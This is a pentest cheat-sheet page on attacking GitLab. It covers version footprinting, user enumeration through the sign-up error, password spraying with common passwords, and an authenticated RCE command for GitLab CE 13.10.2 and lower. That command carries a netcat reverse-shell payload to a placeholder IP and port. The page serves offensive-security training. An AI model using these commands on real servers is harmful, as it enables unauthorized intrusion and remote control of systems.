# Gitlab

### Discovery / Footprinting

The only way to footprint the GitLab version number in use is by browsing to the /help page when logged in. If the GitLab instance allows us to register an account, we can log in and browse to this page to confirm the version. If we cannot register an account, we may have to try a low-risk exploit\
such as :

{% embed url="https://www.exploit-db.com/exploits/49821" %}

### Enumeration

There's not much we can do against GitLab without knowing the version number or being logged in. The first thing we should try is browsing to `/explore` and see if there are any public projects that may contain something interesting

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FepMrAIYhU6TTasrmhRhp%2Fimage.png?alt=media&#x26;token=b10af00e-2896-4e55-9ace-ba3ba3753b92" alt=""><figcaption></figcaption></figure>

Once we are done digging through what is available externally, we should check and see if we can register an account and access additional projects. Suppose the organization did not set up GitLab only to allow company emails to register or require an admin to approve a new account. In that case, we may be able to access additional data

If we try to register with an email that has already been taken, we will get the error `1 error prohibited this user from being saved: Email has already been taken`

We can try user enumeration ⇒ `/users/sign_up`

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FOFSV57RbJeMn9MrYeF14%2Fimage.png?alt=media&#x26;token=e4e7d822-66bf-40dd-9f2c-0c587cc160da" alt=""><figcaption></figcaption></figure>

### Attacking

#### User enumeration

```shellscript
# PoC
https://github.com/dpgg101/GitLabUserEnum
./gitlab_userenum.sh --url <URL> --userlist <WORDLIST>

# Other PoC
https://www.exploit-db.com/exploits/49821

```

Then we can attempt password spraying with common passwords such as `Welcome1` or `Password123`

#### Authenticated RCE

GitLab Community Edition version 13.10.2 and lower suffered from an authenticated remote code execution vuln

{% embed url="https://www.exploit-db.com/exploits/49951" %}

```shellscript
python3 gitlab_13_10_2_rce.py -t <URL> -u <USER> -p <PASS> -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <IP> <PORT> >/tmp/f '
```
